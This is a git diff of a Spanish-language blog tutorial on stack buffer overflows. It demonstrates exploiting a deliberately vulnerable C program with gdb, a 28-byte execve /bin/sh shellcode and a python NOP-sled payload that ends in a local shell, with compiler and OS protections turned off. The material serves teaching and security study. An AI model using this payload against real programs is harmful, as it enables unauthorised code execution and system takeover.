@@ -2,13 +2,12 @@
 layout: post
 title: Buffer Overflow
 excerpt: Introducción a la explotación del buffer overflow
-date: 2012-12-18
+date: 2016-12-18
 categories: code
 comments: true
 share: true
 tags: [security, buffer overflow, exploit]
 ---
-<<<<<<< HEAD
 En este artículo intento explicar con ejemplos cómo funciona un desbordamiento de buffer o _buffer overflow_. Se trata de un tipo de vulnerabilidad que se explota escribiendo más allá del final de un buffer, de tal forma que se modifique la dirección de retorno y se ejecutando un código arbitrario.
 
 ## Organización de la memoria en los procesos
@@ -100,6 +99,8 @@ int main (int argc, char** argv)
 }
 ```
 
+([vuln.c])
+
 Hay una fución `strcpy` que copia datos sin validar los límites (como puede ocurrir con otras como `memcpy`, `gets`...) Es decir, se pueden copiar datos más allá del límite del buffer de destino si el origen es "más largo", sobreescribiendo otros datos.
 
 Ojo, tanto el sistema operativo como el compilador (`gcc` en particular) pueden implementar ciertas protecciones. Así que, para entender bien el proceso, las deshabilitaremos. Las protecciones no son insalvables pero dificultan la explotación y no tiene sentido pelearse con ellas por ahora.
@@ -136,12 +137,14 @@ Un inciso: un _shellcode_ es un conjunto de órdenes programadas generalmente en
 
 No hace falta que nos rompamos la cabeza con esto, podemos usar uno ya disponible; [este shellcode] nos dará una shell con tan solo 28 bytes:
 
-```assembly
+```
 \x31\xc0\x50\x68\x2f\x2f\x73
 \x68\x68\x2f\x62\x69\x6e\x89
 \xe3\x89\xc1\x89\xc2\xb0\x0b
 \xcd\x80\x31\xc0\x40\xcd\x80
 ```
+
+([shellcode])
 
 Este será el código que tendremos que inyectar en la dirección de memoria a la que hagamos apuntar el registro **eip**
 
@@ -149,7 +152,7 @@ Este será el código que tendremos que inyectar en la dirección de memoria a l
 
 Ya sabemos el código que vamos a inyectar; falta saber dónde, y componer las cosas de tal forma que hagamos que las posiciones de memoria sobreescritas apunten a donde necesitamos. En esta tarea nos ayudará el depurador `gdb`:
 
-```shell
+```objdump
 $ gdb -q ./vuln
 Reading symbols from ./vuln...done.
 (gdb) disass main
@@ -273,7 +276,7 @@ Vemos que nuestra cadena de "Aes" comienza en 0xbffff308 (0xbffff2fc + 8). Podem
 $(python -c 'print "\x90"*436 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "BBBB"')
 ```
 
-Simplemente hemos sustituído unos cuantos "\x90" por el shellcode que vamos a utilizar. Si lo ejecutamos, comprobamos que todo sigue como estaba, así que no nos hemos equivocado:
+Simplemente hemos sustituído unos cuantos `\x90` por el shellcode que vamos a utilizar. Si lo ejecutamos, comprobamos que todo sigue como estaba, así que no nos hemos equivocado:
 
 ```shell
 (gdb) run $(python -c 'print "\x90"*466 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*10 + "BBBB"')
@@ -317,7 +320,8 @@ user@debian8-x86:~/exploits$ ./vuln $(python -c 'print "\x90"*466 + "\x31\xc0\x5
 $
 ```
 
+[vuln.c]: https://raw.githubusercontent.com/lmarqueta/exploits/master/vuln.c
+[shellcode]: https://raw.githubusercontent.com/lmarqueta/exploits/master/shellcode-1.txt
 [ASLR]: https://en.wikipedia.org/wiki/Address_space_layout_randomization
 [Wikipedia]: https://es.wikipedia.org/wiki/Shellcode
 [este shellcode]: http://shell-storm.org/shellcode/files/shellcode-827.php
->>>>>>> 53811701b2621475625e1290373a89f6cd9b5556
